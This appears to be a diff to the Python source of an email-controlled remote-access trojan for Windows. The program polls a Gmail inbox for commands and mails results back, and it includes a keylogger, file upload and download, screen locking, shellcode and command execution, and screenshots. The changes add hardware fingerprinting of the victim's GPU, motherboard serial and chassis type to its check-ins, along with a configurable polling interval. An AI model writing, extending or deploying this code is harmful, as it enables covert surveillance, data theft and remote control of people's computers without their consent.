@@ -43,9 +43,9 @@ import platform
 import hashlib
 import ctypes
 import json
-#import logging
+import wmi
 
-#from traceback import print_exc, format_exc
+from enum import Enum
 from base64 import b64decode
 from smtplib import SMTP
 from email.MIMEMultipart import MIMEMultipart
@@ -54,7 +54,7 @@ from email.MIMEText import MIMEText
 from email import Encoders
 from struct import pack
 from zlib import compress, crc32
-from ctypes import c_void_p, c_int, create_string_buffer, sizeof, windll, Structure, POINTER, WINFUNCTYPE, CFUNCTYPE, POINTER
+from ctypes import c_void_p, c_int, create_string_buffer, sizeof, windll, Structure, WINFUNCTYPE, CFUNCTYPE, POINTER
 from ctypes.wintypes import BOOL, DOUBLE, DWORD, HBITMAP, HDC, HGDIOBJ, HWND, INT, LPARAM, LONG, RECT, UINT, WORD, MSG
 from Crypto.Cipher import AES
 from Crypto import Random
@@ -67,6 +67,7 @@ gmail_pwd = '!y0ur_p@ssw0rd!'
 server = "smtp.gmail.com"
 server_port = 587
 AESKey = 'my_AES_key'
+EMAIL_KNOCK_TIMEOUT = 60 #seconds - check for new commands/jobs every EMAIL_KNOCK_TIMEOUT seconds
 #######################################
 
 
@@ -97,6 +98,32 @@ class InfoSecurity:
 infoSec = InfoSecurity()
 
 
+class ChassisTypes(Enum):
+    Other = 1
+    Unknown = 2
+    Desktop = 3
+    LowProfileDesktop = 4
+    PizzaBox = 5
+    MiniTower = 6
+    Tower = 7
+    Portable = 8
+    Laptop = 9
+    Notebook = 10
+    Handheld = 11 
+    DockingStation = 12
+    AllInOne = 13
+    SubNotebook = 14
+    SpaceSaving = 15
+    LunchBox = 16
+    MainSystemChassis = 17
+    ExpansionChassis = 18
+    SubChassis = 19
+    BusExpansionChassis = 20
+    PeripheralChassis = 21
+    StorageChassis = 22
+    RackMountChassis = 23
+    SealedCasePC = 24
+        
 class SystemInfo:
     def __init__(self):
         self.Architecture = platform.machine()
@@ -107,9 +134,32 @@ class SystemInfo:
             self.isAdmin = 'no'
         else:
             self.isAdmin = 'yes'
+        w = wmi.WMI()
+        self.GPU = []
+        for i in w.Win32_VideoController():
+            self.GPU.append(i.Caption.strip())
+        self.Motherboard = ''
+        for i in w.Win32_BaseBoard():
+            self.Motherboard = '{0} {1} {2}'.format(i.Manufacturer, i.Product, i.SerialNumber).strip()
+            break
+        self.ChassisType = ''
+        for i in w.Win32_SystemEnclosure():
+            for j in i.ChassisTypes:
+                self.ChassisType = str(ChassisTypes(j)).split('.')[1]
+                break
+            break
+        
+        self.UniqueID = hashlib.sha256(
+                           self.Architecture + 
+                           self.WinVer + 
+                           self.CPU + 
+                           ';'.join(self.GPU) + 
+                           self.isAdmin + 
+                           self.Motherboard + 
+                           self.ChassisType
+                   ).hexdigest()
+        
             
-        self.UniqueID = hashlib.sha256(self.Architecture + self.WinVer + self.CPU + self.isAdmin).hexdigest()
-    
 sysInfo = SystemInfo()
 
 
@@ -340,6 +390,7 @@ class screenshot(threading.Thread):
 
 ### End of python-mss code ###
 
+
 class MessageParser:
 
     def __init__(self, msg_data):
@@ -362,6 +413,7 @@ class MessageParser:
 
     def getDateHeader(self, msg_data):
         self.date = email.message_from_string(msg_data[1][0][1])['Date']
+
 
 class keylogger(threading.Thread):
     #Stolen from http://earnestwish.com/2015/06/09/python-keyboard-hooking/                                                          
@@ -424,6 +476,7 @@ class keylogger(threading.Thread):
             sendEmail({'cmd': 'keylogger', 'res': 'Keylogger started'}, self.jobid)
             self.startKeyLog()
 
+
 class download(threading.Thread):
 
     def __init__(self, jobid, filepath):
@@ -442,6 +495,7 @@ class download(threading.Thread):
                 sendEmail({'cmd': 'download', 'res': 'Path to file invalid'}, self.jobid)
         except Exception as e:
             sendEmail({'cmd': 'download', 'res': 'Failed: {}'.format(e)}, self.jobid)
+
 
 class upload(threading.Thread):
 
@@ -462,6 +516,7 @@ class upload(threading.Thread):
         except Exception as e:
             sendEmail({'cmd': 'upload', 'res': 'Failed: {}'.format(e)}, self.jobid)
 
+
 class lockScreen(threading.Thread):
 
     def __init__(self, jobid):
@@ -478,6 +533,7 @@ class lockScreen(threading.Thread):
         except Exception as e:
             #if verbose == True: print print_exc()
             pass
+
 
 class execShellcode(threading.Thread):
 
@@ -514,6 +570,7 @@ class execShellcode(threading.Thread):
         except Exception as e:
             #if verbose == True: print_exc()
             pass
+
 
 class execCmd(threading.Thread):
 
@@ -589,7 +646,10 @@ class sendEmail(threading.Thread):
                   'arch': sysInfo.Architecture, 
                   'os': sysInfo.WinVer, 
                   'cpu': sysInfo.CPU,
+                  'gpu': sysInfo.GPU,
+                  'motherboard': sysInfo.Motherboard,
                   'isAdmin': sysInfo.isAdmin,
+                  'chassistype': sysInfo.ChassisType,
                   'msg': self.text
           }))
         
@@ -615,6 +675,7 @@ class sendEmail(threading.Thread):
             except Exception as e:
                 #if verbose == True: print_exc()
                 time.sleep(10)
+
 
 def checkJobs():
     #Here we check the inbox for queued jobs, parse them and start a thread
@@ -674,15 +735,15 @@ def checkJobs():
                         raise NotImplementedError
 
             c.logout()
-
-            time.sleep(10)
+            time.sleep(EMAIL_KNOCK_TIMEOUT)
         
         except Exception as e:
             #logging.debug(format_exc())
-            time.sleep(10)
+            time.sleep(EMAIL_KNOCK_TIMEOUT)
+
 
 if __name__ == '__main__':
-    sendEmail("Welcome!!", checkin=True)
+    sendEmail("Welcome!! :D", checkin=True)
     try:
         checkJobs()
     except KeyboardInterrupt:
